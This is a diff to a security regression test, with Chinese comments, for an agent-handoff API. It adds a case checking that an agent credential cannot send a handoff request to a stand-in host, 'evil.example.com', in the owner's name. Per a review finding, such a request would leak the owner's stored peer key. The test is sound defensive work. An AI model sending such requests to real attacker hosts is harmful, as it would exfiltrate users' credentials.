@@ -278,6 +278,9 @@ const AS_ALICE = { authorization: `Bearer ${aliceKey}` };
     // 第 1 轮审查 P1 实测:只带那两个头就把冲着 alice 的入站来源批了,还把操作人记成 alice。
     { path: `/api/handoff/peers/${peerFp}/approve`, method: "POST", what: "替 owner 批准入站接力来源" },
     { path: `/api/handoff/peers/${peerFp}`, method: "DELETE", what: "删 owner 的入站接力来源" },
+    // 接力申请顶着 owner 的名义去敲别人的门,还会把 owner 存的对端账号 key 一起发出去
+    // (第 2 轮审查 P1)。只读探路仍有 /tasks/:id/handoff/preflight,那条不配对。
+    { path: "/api/handoff/request", method: "POST", body: { targetUrl: "https://evil.example.com" }, what: "替 owner 发接力申请" },
   ];
   for (const w of WRITES) {
     const denied = await call(w.path, w.method, AS_AGENT, w.body);
